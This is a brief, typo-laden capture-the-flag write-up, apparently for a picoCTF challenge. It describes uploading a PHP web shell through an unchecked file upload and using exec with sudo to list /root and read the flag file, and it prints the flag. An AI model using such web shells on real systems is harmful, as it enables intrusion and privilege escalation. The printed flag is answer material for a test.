starting the maching
i knew since i read the description that we will net for crafted program in order to do privilage esclation through file upload
<br>
after we test the file upload we found that its not care about the type of file<br>

we mad a custom php code to get privilage esclation: shell.php

```shell.php
<?php echo exec("sudo -i"); ?> # to get the privilages and test if its working
```

```shell.php
<?php echo exec("sudo ls /root"); ?> # to check the files of root directory
```

we found that there is a file called flag.txt iside /root directory.

```shell.php
<?php echo exec("sudo cat /root/flag.txt"); ?> # readubg the flag
```


flag could be different: picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}
